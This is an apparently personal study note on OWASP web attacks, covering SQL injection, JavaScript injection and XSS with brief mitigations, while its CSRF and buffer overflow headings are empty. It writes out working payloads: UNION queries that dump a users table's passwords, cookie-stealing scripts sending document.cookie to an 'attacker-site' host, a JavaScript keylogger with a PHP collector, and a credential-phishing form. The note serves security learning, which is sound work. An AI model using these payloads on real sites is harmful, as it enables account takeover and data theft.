## OWASP
### SQL Injection
- Find the database
    Suppose a vulnerable website with a backend MySql database allows querying data like so
    ```bash
    $ SELECT col1, col2, col3 from <table> where <col> Like '%{user_input}%'
    ```
    We can verify its a Mysql Database by passing
    ```bash
    value' AND 1 == sleep(3);--
    ```
    If there is a delay in response due to sleep, then its a MySql database else keep trying for equivalent commands for other     database
- Find other tables

    If we pass this value in the user field
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--
    ```
    This will result in the follwing query getting executed in backend
    ```bash
    SELECT col1, col2, col3 from <table> where <col> Like '%some_value' 
    UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--%'
    ```
- Query a sensitive table

    One way to randomly guess is to select from a particular table and execute a sleep. If the table exists then, you will see     delay in response else you will immediately see an error.

    OR

    pass below in user input to see the columns of the sensitive table
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.columns WHERE TABLE_NAME='users');--
    ```
    Now you can query data from sensitive table
    ```bash
    some_value' UNION (SELECT user_password, address, 3 FROM users);--
    ```
Mitigation
- Use parameterized queries
- Validate user input

### Javascript Injection
Can allow the attacker manipulate client side code in the website by injecting malicious javascript via <script></script> tag via an unsanitized user input field
Typical JS Injection targets are:
- Various forums
- Article‘s comments fields
- Guestbooks
- Any other forms where text can be inserted.

Imagine a product comany with a text field for customer reviews. An attacker can then inject the follwing to alter the look and field of the website for other users, when they load the page
```bash
<script>$document.getElementById("some-id").style.visibility="hidden"</script>
```
```bash
<script>document.background-image: url(“other-bad-image.jpg“);</script>
```
Mitigation
- Sanitize user input
- Remove `script` tag when saving in database
### XSS
Attacker tries to gain information by injecting javascript in the target website. 
This can result in
- Cookie theft
    ```bash
    <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
    ```
- Keylogging

    exploit.js
    ```bash
    var keys = '';

    document.onkeypress = function(e) {
        var get = window.event ? event : e;
        var key = get.keyCode ? get.keyCode : get.charCode;
        key = String.fromCharCode(key);
        keys += key;----
    }

    window.setInterval(function(){
        new Image().src = 'http://127.0.0.1/demo/1/exploit/exploit.php?keylog=' + keys;
        keys = '';
    }, 1000);
    ```
    server
    ```bash
    <?php

    if(!empty($_GET['keylog'])) {
        $logfile = fopen('logs.txt', 'a+');
        fwrite($logfile, $_GET['keylog']);
        fclose($logfile);
    }
    ?>
    ```
- Phishing
  The payload below injects a form forcing unsuspecting users to enter login and password
  ```bash
  <h3>Please login to proceed</h3> 
  <form action=http://attacker>
    Username:
    <br><input type="username" name="username"></br>
    Password:
    <br><input type="password" name="password"></br>
    <br><input type="submit" value="Login"></br>
  </form>
  ```
- Perform unauthorized activities
    Posting comment on user's behalf
    ```bash
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
        xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
        xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
    </script>
    ```

Types of XSS
  - Reflective

    When attacker tricks an user to click on a link (sent in email) and adds malicious js code in the link
    ```bash
    https://www.bigbank.com/q?=
    <script>
    document.write('<img src="http://attacker/?cookie='+ document.cookie'"/>')
    </script>
    ```
  - Persistent

    This can happen when attacker successfully injects js in a webpage that loads for other users

    1. Attcker --> POST https://website/comment
    ```bash
    <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
    ```
    2. Website saves comment with js code withing script tag
    3. Victim loads webpage, obliious of malicious js loading GET http://website/comments
    4. Attacker receives cookie 
    ```
    http://attacker-site/?cookie=<some-cookie>
    ```
### CSRF
### Broken authentication
### Privilege excalation
### Buffer Overflow
